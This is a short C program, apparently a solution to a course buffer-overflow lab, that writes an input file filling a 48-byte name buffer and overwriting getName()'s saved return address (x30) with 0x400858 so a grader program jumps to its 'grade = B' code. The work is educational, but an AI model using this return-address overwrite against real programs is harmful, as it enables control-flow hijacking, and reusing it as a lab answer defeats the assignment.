#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(void)
{
     /* Variable to hold index. */
    int i;

    /* Variable to hold name to be
       input into grader program. */
    const char* name = "Tansha Vugarwal";

    /* Address of 'grade = B' instruction
       in text section. */
    unsigned long ulReturnAddress = 0x400858;

    /* File to be written to. */
    FILE *psFile;
    psFile = fopen("dataB", "w");

    /* Printing out hardcoded name from name[0] - name[14]. */
    fprintf(psFile, "%s", name);

    /* Printing null-terminating character 33
       times, to fill up the char array name,
       from name[15] - name[47]. */
    for (i = 0; i < 33; i++)
    {
        /* Write null-terminating character. */
        putc('\0', psFile);
    }

    /* Replace x30 for getName() which is supposed to branch
       back to main at the 'if (strcmp(name, "Andrew Appel") != 0)'
       instruction with the address of the 'grade = B' instruction. */
    fwrite(&ulReturnAddress, sizeof(unsigned long), 1, psFile);

    fclose(psFile);

    /* Return success. */
    return EXIT_SUCCESS;
}

